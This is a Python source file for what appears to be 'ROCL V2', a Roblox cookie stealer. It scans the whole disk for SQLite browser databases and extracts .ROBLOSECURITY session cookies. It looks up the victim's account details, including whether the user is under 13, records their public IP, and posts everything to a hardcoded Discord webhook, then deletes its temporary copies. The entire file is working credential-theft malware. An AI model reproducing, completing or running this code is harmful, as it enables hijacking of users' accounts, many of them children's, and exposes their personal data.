from bs4 import BeautifulSoup as htmlparser
import threading
import requests
import sqlite3
import shutil
import time
import os

webhook = "https://discordapp.com/api/webhooks/1340359093222768691/UPetun9rPBoUaimqu0CFxMQRrFzO1m0j6psTsU-Zluj_x8sBpcmVb4iUgFYI7P1RhVCj"
logged_cookies = []

def search_cookie(file_path: "file") -> None:
    try:
        conn = sqlite3.Connection(file_path)
        sql = conn.execute('SELECT name FROM sqlite_master WHERE type="table"')
        result = sql.fetchall()
        tables = [tablename for table in result for tablename in table]
        for table in tables:
            sql = conn.execute(f'SELECT value FROM {table} WHERE host=".roblox.com" and name=".ROBLOSECURITY"')
            results = sql.fetchall()
            if len(results) == 0: return
            cookies = [value for result in results for value in result]
            for cookie in cookies:
                cookie = cookie.strip()
                if cookie in logged_cookies:
                    continue
                logged_cookies.append(cookie)
                threading.Thread(target=log_cookie, args=[cookie], daemon=False).start()
        return
    except Exception:
        return

def create_dir() -> "dirpath":
    dir_path = f"{os.getenv('TMP')}/.weeweewoo"
    if os.path.exists(dir_path):
        shutil.rmtree(dir_path)
    os.mkdir(dir_path)
    return dir_path

def log_cookie(cookie: str) -> None:
    data = {
        "embeds": [
            {
                "author": {
                    "name": "ROCL V2",
                    "url": "https://github.com/lilmond/RoCL-2",
                    "icon_url": "data:image/jpeg;base64,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"
                },
                "color": 0x6414b4,
                "fields": [
                    {
                        "name": "COOKIE",
                        "value": cookie,
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "lilmond@github",
                    "icon_url": "https://raw.githubusercontent.com/lilmond/RoCL-2/main/img/profile.jpeg"
                }
            }
        ]
    }

    extra_fields = []
    user_info = get_cookie(cookie)
    if not user_info:
        add_field(extra_fields, "USER INFO", "Unable to get user info", True)
    else:
        add_field(extra_fields, "USERNAME", user_info.get("data-name"), True)
        add_field(extra_fields, "USER ID", user_info.get("data-userid"), True)
        add_field(extra_fields, "PREMIUM", user_info.get("data-ispremiumuser"), True)
        add_field(extra_fields, "UNDERAGE", user_info.get("data-isunder13"), True)
        add_field(extra_fields, "JOIN DATE", user_info.get("data-created"), True)
    ip = get_ip()
    add_field(extra_fields, "IP", ip, True)

    data["embeds"][0]["fields"] += extra_fields
    while True:
        try:
            http = requests.post(webhook, json=data)
            if not str(http.status_code).startswith("2"):
                continue
            break
        except Exception:
            continue
    return

def get_cookie(cookie: str) -> dict:
    try:
        http = requests.get("https://www.roblox.com/home", cookies={".ROBLOSECURITY": cookie})
        html = htmlparser(http.text, features="html.parser")
        user_info = html.find("meta", {"name": "user-data"})
        return user_info
    except Exception:
        return

def get_ip() -> str:
    try:
        http = requests.get("https://api.ipify.org")
        ip = http.text
        return ip
    except Exception:
        return "Unable to get IP address"

def add_field(field: list, field_name: str, field_value: str, inline: bool) -> list:
    field.append({"name": field_name, "value": field_value, "inline": inline})
    return field

def add_onstartup() -> None:
    pass

def main():
    hidden_dir = create_dir()
    print(f"DIR: {hidden_dir}")
    sequence = 0
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith(".sqlite"):
                sequence += 1
                if not root.endswith("/"): root = f"{root}/"
                file_path1 = f"{root}{file}"
                file_path2 = f"{hidden_dir}/cookies{sequence}.sqlite"
                shutil.copyfile(file_path1, file_path2)
                while True:
                    if threading.active_count() > 50:
                        time.sleep(.1)
                        continue
                    threading.Thread(target=search_cookie, args=[file_path2], daemon=False).start()
                    break

    while True:
        if threading.active_count() == 1:
            shutil.rmtree(hidden_dir)
            return
        time.sleep(.1)

if __name__ == "__main__":
    try:
        add_onstartup()
        while True:
            main()
            time.sleep(5)
    except KeyboardInterrupt:
        pass
